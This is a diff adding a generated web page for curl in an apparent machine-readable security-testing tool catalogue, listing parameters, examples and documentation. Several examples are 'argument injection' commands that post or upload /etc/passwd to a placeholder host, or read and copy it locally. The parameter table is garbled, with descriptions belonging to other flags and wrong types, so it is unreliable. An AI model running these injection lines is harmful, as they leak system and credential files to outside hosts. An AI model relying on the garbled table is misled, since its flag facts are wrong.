@@ -1,0 +1,157 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="Transfers data from or to a server using supported protocols (HTTP, HTTPS, FTP, SFTP, SCP, etc.)."><link rel="alternate" type="text/markdown" href="/tools/network-http-curl.md"><link rel="alternate" type="application/json" href="/api/v1/commands.json"><meta name="tool-namespace" content="network:http:curl"><title>curl — AutoTest Knowledge Repository</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"><link rel="stylesheet" href="/src/styles/global.css"><link rel="stylesheet" href="/_astro/_id_.CIRgCC12.css"><script type="module" src="/_astro/hoisted.DLmBDdUQ.js"></script></head> <body> <div class="wrapper"> <nav> <a href="/" class="nav-brand">AutoTest</a> <a href="/">Home</a> <a href="/tools">All Tools</a> <a href="/capabilities">Capabilities</a> <a href="/artifacts">Artifacts</a> <a href="/payloads">Payloads</a> <a href="/api/v1/commands.json">API (JSON)</a> <a href="/llms.txt">llms.txt</a> </nav>  <div class="two-col"> <div> <div class="meta-bar"> <span class="tag tag-domain">network</span> <span class="tag">enabled</span> <span class="tag tag-trust">verified</span> <span class="tag tag-risk-low">low</span> <span class="tag">v1.0.0</span> </div> <h1 style="font-size: 2.2rem; margin-bottom: 0.5rem;">curl</h1> <p style="font-size: 1.05rem; color: var(--text-secondary); margin-bottom: 1.5rem;"><em>Transfers data from or to a server using supported protocols (HTTP, HTTPS, FTP, SFTP, SCP, etc.).</em></p> <div id="cosmos-bar" class="cosmos-bar" data-astro-cid-slm2pk6o> <button class="cosmos-toggle" onclick="toggleCosmos()" aria-label="Toggle cosmos config" data-astro-cid-slm2pk6o> <span class="cosmos-icon" data-astro-cid-slm2pk6o>&#9881;</span> <span class="cosmos-label" data-astro-cid-slm2pk6o>Cosmos</span> <span class="cosmos-badge" id="cosmos-badge" data-astro-cid-slm2pk6o>10.10.10.10:9001</span> <span class="cosmos-arrow" id="cosmos-arrow" data-astro-cid-slm2pk6o>&#9660;</span> </button> <div class="cosmos-panel" id="cosmos-panel" data-astro-cid-slm2pk6o> <div class="cosmos-fields" id="cosmos-fields" data-astro-cid-slm2pk6o> <!-- populated by cosmos.js --> </div> <div class="cosmos-actions" data-astro-cid-slm2pk6o> <button class="cosmos-btn" onclick="Cosmos.reset()" data-astro-cid-slm2pk6o>Reset to defaults</button> </div> </div> </div> <script>(function(){const defaultExpandedStr = "false";
+
+  const EXPANDED_KEY = "cosmos-expanded";
+  const defaultExpanded = defaultExpandedStr;
+
+  window.toggleCosmos = function () {
+    const bar = document.getElementById("cosmos-bar");
+    const panel = document.getElementById("cosmos-panel");
+    const arrow = document.getElementById("cosmos-arrow");
+    const isExpanded = bar.classList.toggle("expanded");
+    panel.style.display = isExpanded ? "block" : "none";
+    arrow.innerHTML = isExpanded ? "&#9660;" : "&#9660;";
+    try { localStorage.setItem(EXPANDED_KEY, isExpanded ? "1" : "0"); } catch (_) {}
+  };
+
+  (function initCosmosBar() {
+    const panel = document.getElementById("cosmos-panel");
+    const fields = document.getElementById("cosmos-fields");
+    const badge = document.getElementById("cosmos-badge");
+    const bar = document.getElementById("cosmos-bar");
+
+    try {
+      const saved = localStorage.getItem(EXPANDED_KEY);
+      if (saved === "1" || (saved === null && defaultExpanded === "true")) {
+        bar.classList.add("expanded");
+        if (panel) panel.style.display = "block";
+      }
+    } catch (_) {}
+
+    function render() {
+      if (!window.Cosmos) { setTimeout(render, 10); return; }
+      var config = window.Cosmos.getConfig();
+      if (!fields) return;
+      fields.innerHTML = config.map(function (c) {
+        var val = window.Cosmos.get(c.key);
+        var esc = function (s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); };
+        return '<div class="cosmos-field">' +
+          '<label for="cosmos-' + esc(c.key) + '">' + esc(c.label) + '</label>' +
+          '<input id="cosmos-' + esc(c.key) + '" type="' + (c.type === "number" ? "number" : "text") + '" ' +
+            'value="' + esc(val) + '" ' +
+            'placeholder="' + esc(c.placeholder || "") + '" ' +
+            'data-cosmos-key="' + esc(c.key) + '" ' +
+            'oninput="onCosmosInput(this)" />' +
+          '</div>';
+      }).join("");
+      updateBadge();
+    }
+
+    window.onCosmosInput = function (el) {
+      var key = el.getAttribute("data-cosmos-key");
+      if (window.Cosmos) window.Cosmos.set(key, el.value);
+    };
+
+    function updateBadge() {
+      if (!badge) return;
+      var ip = window.Cosmos ? window.Cosmos.get("ip") || "?" : "?";
+      var port = window.Cosmos ? window.Cosmos.get("port") || "?" : "?";
+      badge.textContent = ip + ":" + port;
+    }
+
+    if (window.Cosmos) {
+      window.Cosmos.onChange(function () { updateBadge(); });
+    }
+    render();
+  })();
+})();</script>  <div class="cmd-preview cosmos-preview" data-preview="{&#34;template&#34;:&#34;curl {abstract-unix-socket} {append} {aws-sigv4} {cert} {config}&#34;,&#34;globalVars&#34;:{&#34;target&#34;:&#34;ip&#34;,&#34;port&#34;:&#34;port&#34;},&#34;paramNames&#34;:[&#34;abstract-unix-socket&#34;,&#34;append&#34;,&#34;aws-sigv4&#34;,&#34;cert&#34;,&#34;config&#34;]}" data-astro-cid-wofrsxkc> <div class="cmd-preview-header" data-astro-cid-wofrsxkc> <span class="cmd-preview-label" data-astro-cid-wofrsxkc>&#128203; Live Preview</span> <button class="cmd-preview-copy" onclick="copyPreviewCommand(this)" title="Copy command" data-astro-cid-wofrsxkc>&#128203; Copy</button> </div> <pre class="cmd-preview-output" id="cmd-preview-output" data-astro-cid-wofrsxkc><code data-astro-cid-wofrsxkc>curl {abstract-unix-socket} {append} {aws-sigv4} {cert} {config}</code></pre> <div class="cmd-preview-params" id="cmd-preview-params" data-astro-cid-wofrsxkc> <span class="cmd-placeholder" data-ph="abstract-unix-socket" data-astro-cid-wofrsxkc> <code class="ph-tag ph-local" data-astro-cid-wofrsxkc> 📎 abstract-unix-socket </code> </span><span class="cmd-placeholder" data-ph="append" data-astro-cid-wofrsxkc> <code class="ph-tag ph-local" data-astro-cid-wofrsxkc> 📎 append </code> </span><span class="cmd-placeholder" data-ph="aws-sigv4" data-astro-cid-wofrsxkc> <code class="ph-tag ph-local" data-astro-cid-wofrsxkc> 📎 aws-sigv4 </code> </span><span class="cmd-placeholder" data-ph="cert" data-astro-cid-wofrsxkc> <code class="ph-tag ph-local" data-astro-cid-wofrsxkc> 📎 cert </code> </span><span class="cmd-placeholder" data-ph="config" data-astro-cid-wofrsxkc> <code class="ph-tag ph-local" data-astro-cid-wofrsxkc> 📎 config </code> </span> </div> </div>   <div style="margin-bottom: 1.5rem;"> <pre><code>curl {abstract-unix-socket} {append} {aws-sigv4} {cert} {config}</code></pre> <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.3rem;">
+Sandbox: execFile &middot; Timeout: 60s
+ </p> </div> </div> <aside class="sidebar-info"> <div class="cvss-widget" data-astro-cid-qmhzttxy> <div class="cvss-score" style="--score-color: #93c5fd;" data-astro-cid-qmhzttxy> <span class="cvss-value" data-astro-cid-qmhzttxy>2.0</span> <span class="cvss-label" data-astro-cid-qmhzttxy>Low</span> </div> <div class="cvss-bar-track" data-astro-cid-qmhzttxy> <div class="cvss-bar-fill" style="width: 20%; background: #93c5fd;" data-astro-cid-qmhzttxy></div> </div> <div class="cvss-scale" data-astro-cid-qmhzttxy> <span data-astro-cid-qmhzttxy>0.0</span> <span style="color: var(--green);" data-astro-cid-qmhzttxy>Low</span> <span style="color: var(--amber);" data-astro-cid-qmhzttxy>Med</span> <span style="color: #fb923c;" data-astro-cid-qmhzttxy>High</span> <span style="color: var(--red);" data-astro-cid-qmhzttxy>10.0</span> </div>  </div>  <div style="font-weight:600;margin-bottom:0.75rem;font-size:0.9rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.05em;">Info</div> <div class="info-row"><span class="info-label">ID</span><span class="info-value"><code>network-http-curl</code></span></div> <div class="info-row"><span class="info-label">Namespace</span><span class="info-value" style="font-size:0.8rem;"><code>network:http:curl</code></span></div> <div class="info-row"><span class="info-label">Version</span><span class="info-value">1.0.0</span></div> <div class="info-row"><span class="info-label">Risk</span><span class="info-value tag-risk-low">low</span></div> <div class="info-row"><span class="info-label">Trust</span><span class="info-value">verified</span></div> <div class="info-row"><span class="info-label">Policy</span><span class="info-value">enabled</span></div> <div class="info-row"><span class="info-label">Platforms</span><span class="info-value" style="font-size:0.8rem;">linux, macos, windows, cross-platform</span></div> <div class="info-row"><span class="info-label">Arch</span><span class="info-value" style="font-size:0.8rem;">amd64, arm64, cross-platform</span></div> <div class="info-row"><span class="info-label">Allowed Tools</span><span class="info-value" style="font-size:0.8rem;">curl, Bash, execFile</span></div> <div class="info-row" style="flex-direction:column;gap:0.25rem;padding:0.6rem 0;"> <span class="info-label">Integrity</span> <span class="info-value" style="font-size:0.65rem;font-family:var(--font-mono);word-break:break-all;line-height:1.4;">sha256:dcd06bbcbf7c0408d386cc983286287aed62e304a3f2e7e1402aebd315b38ca0</span> </div>    <div class="info-row"><span class="info-label">Techniques</span><span class="info-value" style="font-size:0.8rem;">command-and-control, discovery, enumeration, collection, data-manipulation, exfiltration</span></div>  </aside> </div> <div class="section"> <h2>Capabilities</h2> <div class="card-grid cols-2" style="margin-bottom:0;"> <div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>network.transfer.download</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>network.transfer.upload</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>network.http.api</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>network.http.fetch</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>network.http.inspect</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>system.file.read</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>system.file.write</code> </div> </div> </div><div class="section"> <h2>Parameters</h2> <div class="table-wrap"> <table> <thead> <tr> <th>Name</th> <th>Type</th> <th>Required</th> <th>Default</th> <th>Description</th> <th>Aliases</th> </tr> </thead> <tbody> <tr> <td><code>abstract-unix-socket</code></td> <td>file</td> <td>No</td> <td>-</td> <td>--alt-svc &lt;filename&gt; Enable alt-svc with this cache file --anyauth Pick any authentication method</td> <td><code>--abstract-unix-socket &lt;path&gt;</code></td> </tr><tr> <td><code>append</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Append to target file when uploading</td> <td><code>-a</code>, <code>--append</code></td> </tr><tr> <td><code>aws-sigv4</code></td> <td>url</td> <td>No</td> <td>-</td> <td>--basic HTTP Basic Authentication --ca-native Load CA certs from the OS --cacert &lt;file&gt; CA certificate to verify peer against --capath &lt;dir&gt; CA directory to verify peer against</td> <td><code>--aws-sigv4 &lt;provider1[:prvdr2[:reg[:srv]]]&gt;</code></td> </tr><tr> <td><code>cert</code></td> <td>string</td> <td>No</td> <td>-</td> <td>--cert-status Verify server cert status OCSP-staple --cert-type &lt;type&gt; Certificate type (DER/PEM/ENG/PROV/P12) --ciphers &lt;list&gt; TLS 1.2 (1.1, 1.0) ciphers to use --compressed Request compressed res...</td> <td><code>-E</code>, <code>--cert &lt;certificate[:password]&gt;</code></td> </tr><tr> <td><code>config</code></td> <td>file</td> <td>No</td> <td>-</td> <td>Read config from a file</td> <td><code>-K</code>, <code>--config &lt;file&gt;</code></td> </tr><tr> <td><code>connect-timeout</code></td> <td>integer</td> <td>No</td> <td>-</td> <td>Maximum time allowed to connect</td> <td><code>--connect-timeout &lt;seconds&gt;</code></td> </tr><tr> <td><code>connect-to</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Set the connect-to parameter</td> <td><code>--connect-to &lt;HOST1:PORT1:HOST2:PORT2&gt;</code></td> </tr><tr> <td><code>continue-at</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Resumed transfer offset</td> <td><code>-C</code>, <code>--continue-at &lt;offset&gt;</code></td> </tr><tr> <td><code>cookie</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Send cookies from string/load from file</td> <td><code>-b</code>, <code>--cookie &lt;data|filename&gt;</code></td> </tr><tr> <td><code>cookie-jar</code></td> <td>file</td> <td>No</td> <td>-</td> <td>Save cookies to &lt;filename&gt; after operation</td> <td><code>-c</code>, <code>--cookie-jar &lt;filename&gt;</code></td> </tr><tr> <td><code>create-dirs</code></td> <td>file</td> <td>No</td> <td>-</td> <td>Create necessary local directory hierarchy</td> <td><code>--create-dirs</code></td> </tr><tr> <td><code>create-file-mode</code></td> <td>string</td> <td>No</td> <td>-</td> <td>File mode for created files</td> <td><code>--create-file-mode &lt;mode&gt;</code></td> </tr><tr> <td><code>crlf</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Convert LF to CRLF in upload</td> <td><code>--crlf</code></td> </tr><tr> <td><code>crlfile</code></td> <td>file</td> <td>No</td> <td>-</td> <td>Certificate Revocation list</td> <td><code>--crlfile &lt;file&gt;</code></td> </tr><tr> <td><code>curves</code></td> <td>array</td> <td>No</td> <td>-</td> <td>(EC) TLS key exchange algorithms to request</td> <td><code>--curves &lt;list&gt;</code></td> </tr><tr> <td><code>data</code></td> <td>url</td> <td>No</td> <td>-</td> <td>HTTP POST data</td> <td><code>-d</code>, <code>--data &lt;data&gt;</code></td> </tr><tr> <td><code>data-ascii</code></td> <td>url</td> <td>No</td> <td>-</td> <td>HTTP POST ASCII data</td> <td><code>--data-ascii &lt;data&gt;</code></td> </tr><tr> <td><code>data-binary</code></td> <td>url</td> <td>No</td> <td>-</td> <td>HTTP POST binary data</td> <td><code>--data-binary &lt;data&gt;</code></td> </tr><tr> <td><code>data-raw</code></td> <td>url</td> <td>No</td> <td>-</td> <td>HTTP POST data, &#39;@&#39; allowed</td> <td><code>--data-raw &lt;data&gt;</code></td> </tr><tr> <td><code>data-urlencode</code></td> <td>url</td> <td>No</td> <td>-</td> <td>HTTP POST data URL encoded</td> <td><code>--data-urlencode &lt;data&gt;</code></td> </tr><tr> <td><code>delegation</code></td> <td>integer</td> <td>No</td> <td>-</td> <td>GSS-API delegation permission</td> <td><code>--delegation &lt;LEVEL&gt;</code></td> </tr><tr> <td><code>digest</code></td> <td>url</td> <td>No</td> <td>-</td> <td>HTTP Digest Authentication</td> <td><code>--digest</code></td> </tr><tr> <td><code>disable</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Disable .curlrc</td> <td><code>-q</code>, <code>--disable</code></td> </tr><tr> <td><code>disable-eprt</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Inhibit using EPRT or LPRT</td> <td><code>--disable-eprt</code></td> </tr><tr> <td><code>disable-epsv</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Inhibit using EPSV</td> <td><code>--disable-epsv</code></td> </tr><tr> <td><code>disallow-username-in-url</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Disallow username in URL</td> <td><code>--disallow-username-in-url</code></td> </tr><tr> <td><code>dns-interface</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Interface to use for DNS requests</td> <td><code>--dns-interface &lt;interface&gt;</code></td> </tr><tr> <td><code>dns-ipv4-addr</code></td> <td>string</td> <td>No</td> <td>-</td> <td>IPv4 address to use for DNS requests</td> <td><code>--dns-ipv4-addr &lt;address&gt;</code></td> </tr><tr> <td><code>dns-ipv6-addr</code></td> <td>string</td> <td>No</td> <td>-</td> <td>IPv6 address to use for DNS requests</td> <td><code>--dns-ipv6-addr &lt;address&gt;</code></td> </tr><tr> <td><code>dns-servers</code></td> <td>string</td> <td>No</td> <td>-</td> <td>DNS server addrs to use</td> <td><code>--dns-servers &lt;addresses&gt;</code></td> </tr> </tbody> </table> </div> </div><div class="section"> <h2>Artifacts</h2> <div class="table-wrap"> <table> <thead> <tr><th>Type</th><th>Description</th><th>MIME</th><th>Schema</th><th>Trust</th></tr> </thead> <tbody> <tr><td><code>network.http.response</code></td><td>Raw HTTP response body</td><td>text/plain</td><td>-</td><td>verified</td></tr><tr><td><code>network.http.headers</code></td><td>HTTP response headers</td><td>text/plain</td><td>-</td><td>verified</td></tr><tr><td><code>network.transfer.file</code></td><td>File downloaded from remote server</td><td>-</td><td>-</td><td>community</td></tr> </tbody> </table> </div> </div><div class="section"> <h2>Contract</h2> <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;"> <div> <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:0.5rem;text-transform:uppercase;letter-spacing:0.05em;">Inputs</p> <div class="card" style="padding:0.65rem 0.85rem;margin-bottom:0.5rem;animation:none;"> <code>network.target.url</code> <p style="font-size:0.8rem;color:var(--text-muted);margin-top:0.2rem;">Target URL for HTTP request</p> </div><div class="card" style="padding:0.65rem 0.85rem;margin-bottom:0.5rem;animation:none;"> <code>network.http.headers</code> <p style="font-size:0.8rem;color:var(--text-muted);margin-top:0.2rem;">Custom HTTP request headers</p> </div> </div> <div> <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:0.5rem;text-transform:uppercase;letter-spacing:0.05em;">Outputs</p> <div class="card" style="padding:0.65rem 0.85rem;margin-bottom:0.5rem;animation:none;"> <code>network.http.response</code> <p style="font-size:0.8rem;color:var(--text-muted);margin-top:0.2rem;">HTTP response body</p> </div><div class="card" style="padding:0.65rem 0.85rem;margin-bottom:0.5rem;animation:none;"> <code>network.http.headers</code> <p style="font-size:0.8rem;color:var(--text-muted);margin-top:0.2rem;">HTTP response headers</p> </div> </div> </div> <div class="card" style="margin-top:0.75rem;animation:none;"> <span style="font-size:0.85rem;color:var(--text-muted);">Side effects: </span> <code style="font-size:0.8rem;">network_traffic</code> </div> </div><div class="section"> <h2>Workflow Edges</h2> <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;"> <div> <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:0.5rem;text-transform:uppercase;letter-spacing:0.05em;">Produces</p> <span class="tag" style="margin:0.15rem;">network.http.response</span><span class="tag" style="margin:0.15rem;">network.http.headers</span> </div> <div> <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:0.5rem;text-transform:uppercase;letter-spacing:0.05em;">Consumes</p> <span class="tag" style="margin:0.15rem;">network.target.url</span><span class="tag" style="margin:0.15rem;">network.http.headers</span> </div> </div> </div><div class="section"> <h2>Resource Profile</h2> <div class="table-wrap" style="max-width:400px;"> <table> <thead><tr><th>Resource</th><th>Value</th></tr></thead> <tbody> <tr><td>CPU</td><td>low</td></tr> <tr><td>Memory</td><td>32 MB</td></tr> <tr><td>Network</td><td>medium</td></tr> <tr><td>Disk I/O</td><td>low</td></tr> </tbody> </table> </div> </div><div class="section"> <h2>Examples</h2> <div class="example"> <p><strong>Perform a simple GET request</strong></p> <pre><code>curl https://api.example.com/endpoint</code></pre> </div><div class="example"> <p><strong>POST JSON data to an API</strong></p> <pre><code>curl -X POST -H &#39;Content-Type: application/json&#39; -d &#39;{&quot;key&quot;:&quot;value&quot;}&#39; https://api.example.com/submit</code></pre> </div><div class="example"> <p><strong>Download a file with progress</strong></p> <pre><code>curl -L -o file.zip https://example.com/file.zip</code></pre> </div><div class="example"> <p><strong>Inspect response headers only</strong></p> <pre><code>curl -I https://example.com</code></pre> </div><div class="example"> <p><strong>Send a local file to a remote server in a POST request.</strong></p> <pre><code>curl --data @/etc/passwd http://website.com/
+</code></pre> </div><div class="example"> <p><strong>Read local files by using the file:// schema.</strong></p> <pre><code>curl file:///etc/passwd
+</code></pre> </div><div class="example"> <p><strong>Downloads a file to a destination.</strong></p> <pre><code>curl http://website.com/ -o /tmp/
+</code></pre> </div><div class="example"> <p><strong>Argument injection: upload file: Send a local file to a remote server in a POST request.</strong></p> <pre><code>curl --data @/etc/passwd http://website.com/</code></pre> </div><div class="example"> <p><strong>Argument injection: upload file: Send a local file to a remote server in a POST request.</strong></p> <pre><code>curl -F &#39;var=@/etc/passwd&#39; http://website.com/</code></pre> </div><div class="example"> <p><strong>Argument injection: upload file: Send a local file to a remote server in a POST request.</strong></p> <pre><code>curl --upload-file /etc/passwd http://website.com/</code></pre> </div><div class="example"> <p><strong>Argument injection: read local file: Read local files by using the file:// schema.</strong></p> <pre><code>curl file:///etc/passwd</code></pre> </div><div class="example"> <p><strong>Argument injection: download file: Downloads a file to a destination.</strong></p> <pre><code>curl http://website.com/ -o /tmp/</code></pre> </div><div class="example"> <p><strong>Argument injection: write to local file: Uses file-read to effectively copy files.</strong></p> <pre><code>curl file:///etc/passwd -o /tmp/</code></pre> </div><div class="example"> <p><strong>Download a file from a URL and save it with a specific name</strong></p> <pre><code>curl -o filename.ext http://example.com/file.txt</code></pre> </div><div class="example"> <p><strong>Download a file from a URL and save it with the original filename</strong></p> <pre><code>curl -O http://example.com/file.txt</code></pre> </div><div class="example"> <p><strong>Download a file and limit the download speed</strong></p> <pre><code>curl --limit-rate 100K http://example.com/file.txt</code></pre> </div><div class="example"> <p><strong>Follow redirects if the URL has moved</strong></p> <pre><code>curl -L http://example.com</code></pre> </div><div class="example"> <p><strong>Send POST data to a server</strong></p> <pre><code>curl -d &quot;name=value&quot; http://example.com/resource</code></pre> </div><div class="example"> <p><strong>Send JSON data with a POST request</strong></p> <pre><code>curl -H &quot;Content-Type: application/json&quot; -d &#39;{&quot;key&quot;:&quot;value&quot;}&#39; http://example.com/resource</code></pre> </div><div class="example"> <p><strong>Include headers in the output</strong></p> <pre><code>curl -i http://example.com</code></pre> </div><div class="example"> <p><strong>Display only the HTTP headers for a GET request</strong></p> <pre><code>curl -I http://example.com</code></pre> </div><div class="example"> <p><strong>Send a request with a custom header</strong></p> <pre><code>curl -H &quot;Custom-Header: Value&quot; http://example.com</code></pre> </div><div class="example"> <p><strong>Authenticate with a username and password</strong></p> <pre><code>curl -u username:password http://example.com</code></pre> </div><div class="example"> <p><strong>Use a different request method like PUT or DELETE</strong></p> <pre><code>curl -X PUT http://example.com/resource</code></pre> </div><div class="example"> <p><strong>Download multiple URLs in sequence</strong></p> <pre><code>curl -O http://example.com/file1.txt -O http://example.com/file2.txt</code></pre> </div><div class="example"> <p><strong>Resume a failed or interrupted download</strong></p> <pre><code>curl -C - -O http://example.com/largefile.zip</code></pre> </div><div class="example"> <p><strong>Transfer a file using FTP</strong></p> <pre><code>curl -T localfile.txt ftp://ftp.example.com/upload/</code></pre> </div><div class="example"> <p><strong>Specify a proxy for the request</strong></p> <pre><code>curl -x http://proxy-server:port http://example.com</code></pre> </div><div class="example"> <p><strong>Send data with the URL encoded format</strong></p> <pre><code>curl --data-urlencode &quot;key=value&quot; http://example.com/resource</code></pre> </div><div class="example"> <p><strong>Save the response headers to a file</strong></p> <pre><code>curl -D headers.txt http://example.com</code></pre> </div><div class="example"> <p><strong>Download a file and run it through a pipe (e.g., to `grep`)</strong></p> <pre><code>curl http://example.com/file.txt | grep &quot;search-string&quot;</code></pre> </div> </div><div class="section"> <h2>Documentation</h2> <div class="body-content"><h1>curl — Data Transfer Client</h1>
+<p>curl is a command-line tool for transferring data using URL syntax, supporting a wide range of protocols including HTTP, HTTPS, FTP, SFTP, SCP, LDAP, and more. It is one of the most widely used and versatile networking utilities available.</p>
+<h2>Core Concepts</h2>
+<p>curl operates on a simple principle: provide a URL and optional configuration flags, and it will transfer data to or from that endpoint. It supports every major authentication method, protocol variant, and data encoding scheme.</p>
+<h3>Request Methods</h3>
+<p>The HTTP method defines the type of operation curl performs:</p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Purpose</th>
+<th>Common Use Case</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>GET</code></td>
+<td>Retrieve data</td>
+<td>API queries, page downloads</td>
+</tr>
+<tr>
+<td><code>POST</code></td>
+<td>Submit new data</td>
+<td>Form submissions, API writes</td>
+</tr>
+<tr>
+<td><code>PUT</code></td>
+<td>Replace existing data</td>
+<td>Resource updates</td>
+</tr>
+<tr>
+<td><code>DELETE</code></td>
+<td>Remove a resource</td>
+<td>API deletions</td>
+</tr>
+<tr>
+<td><code>PATCH</code></td>
+<td>Partial resource modification</td>
+<td>Incremental updates</td>
+</tr>
+<tr>
+<td><code>HEAD</code></td>
+<td>Retrieve headers only</td>
+<td>Link checking, metadata</td>
+</tr>
+</tbody></table>
+<h2>Common Usage Patterns</h2>
+<h3>API Testing</h3>
+<p>curl is the de facto standard for API testing from the command line:</p>
+<pre><code class="language-bash"># Authenticated API call with bearer token
+curl -H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIs...&quot; \
+     -H &quot;Accept: application/json&quot; \
+     https://api.example.com/v1/users
+
+# GraphQL query
+curl -X POST \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#39;{&quot;query&quot;: &quot;query { users { id name } }&quot;}&#39; \
+  https://api.example.com/graphql
+</code></pre>
+<h3>File Transfer</h3>
+<pre><code class="language-bash"># Resume an interrupted download
+curl -C - -o largefile.iso https://example.com/largefile.iso
+
+# Upload a file via FTP
+curl -T localfile.txt ftp://ftp.example.com/upload/
+</code></pre>
+<h3>Debugging and Inspection</h3>
+<pre><code class="language-bash"># Verbose output showing full request/response
+curl -v https://example.com
+
+# Trace with timing breakdown
+curl -w &quot;\nTime: %{time_total}s\n&quot; https://example.com
+</code></pre>
+<h2>Security Considerations</h2>
+<ul>
+<li>Use <code>-k</code>/<code>--insecure</code> only for testing; never in production scripts</li>
+<li>Always verify SSL certificates in automated workflows</li>
+<li>Be aware that <code>-d</code> data appears in process listings; use <code>--data-urlencode</code> for sensitive payloads</li>
+<li>Prefer environment variables or <code>.netrc</code> files over inline credentials</li>
+</ul>
+<h2>Related Tools</h2>
+<ul>
+<li><strong><a href="../traffic/wget.md">wget</a></strong> — Alternative download tool with recursive capabilities</li>
+<li><strong><a href="../http/httpie.md">httpie</a></strong> — Human-friendly HTTP client with syntax highlighting</li>
+<li><strong><a href="../text/jq.md">jq</a></strong> — JSON processor for post-processing curl output</li>
+</ul>
+</div> </div><div class="section"> <h2>Related Tools</h2> <span class="tag" style="margin:0.15rem;">jq</span><span class="tag" style="margin:0.15rem;">httpie</span><span class="tag" style="margin:0.15rem;">wget</span><span class="tag" style="margin:0.15rem;">network-http-wget</span> </div><div class="section"> <h2>References</h2> <ul> <li><a href="https://curl.se/docs/manpage.html" target="_blank">Official curl documentation</a></li><li><a href="https://everything.curl.dev/" target="_blank">Everything curl book</a></li> </ul> </div> <footer> <p>AutoTest Knowledge Repository — Dual-Purpose Human / Machine Reference</p> <p>90 tools · 7 domains · 274 capabilities · 87 workflow edges · 135 payloads</p> </footer> </div>  </body> </html>
